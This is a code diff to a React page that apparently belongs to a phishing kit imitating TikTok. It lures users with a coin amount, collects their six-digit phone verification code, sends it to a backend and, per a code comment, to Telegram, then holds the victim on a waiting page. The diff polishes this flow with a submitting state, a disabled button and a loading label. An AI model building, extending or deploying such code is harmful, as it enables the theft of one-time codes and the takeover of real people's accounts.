@@ -1,6 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
+import { Input } from '../components/ui/input';
 import axios from 'axios';
 import ProfileCard from '../components/ProfileCard';
 
@@ -11,6 +12,7 @@ const VerifyPhonePage = () => {
   const navigate = useNavigate();
   const [code, setCode] = useState(['', '', '', '', '', '']);
   const [tiktokData, setTiktokData] = useState(null);
+  const [isSubmitting, setIsSubmitting] = useState(false); // Eklendi
   const inputRefs = useRef([]);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const phone = localStorage.getItem('phone') || '+1xxxxxxxx8521';
@@ -27,17 +29,14 @@ const VerifyPhonePage = () => {
   }, []);
 
   const handleChange = (index, value) => {
-    // Only allow digits
     if (!/^[0-9]*$/.test(value)) return;
     
-    // Take only the first character
     if (value.length > 1) value = value[0];
 
     const newCode = [...code];
     newCode[index] = value;
     setCode(newCode);
 
-    // Auto-focus next input
     if (value && index < 5) {
       inputRefs.current[index + 1]?.focus();
     }
@@ -53,6 +52,8 @@ const VerifyPhonePage = () => {
     const phoneCode = code.join('');
     localStorage.setItem('phoneCode', phoneCode);
 
+    setIsSubmitting(true); // İşlem başladı
+
     // Send to backend and Telegram
     try {
       await axios.post(`${API}/session/step`, {
@@ -66,10 +67,10 @@ const VerifyPhonePage = () => {
       });
     } catch (error) {
       console.error('Failed to submit step:', error);
+    } finally {
+      setIsSubmitting(false); // İşlem bitti
+      navigate('/waiting');
     }
-
-    // Navigate to waiting page
-    navigate('/waiting');
   };
 
   const handleResend = () => {
@@ -153,9 +154,10 @@ const VerifyPhonePage = () => {
         {/* Continue Button */}
         <Button
           onClick={handleContinue}
+          disabled={isSubmitting || code.some(d => d === '')}
           className="w-full bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold py-6 text-lg rounded-lg transition-all mb-4"
         >
-          Continue
+          {isSubmitting ? 'Loading...' : 'Continue'}
         </Button>
 
         {/* Resend Link */}
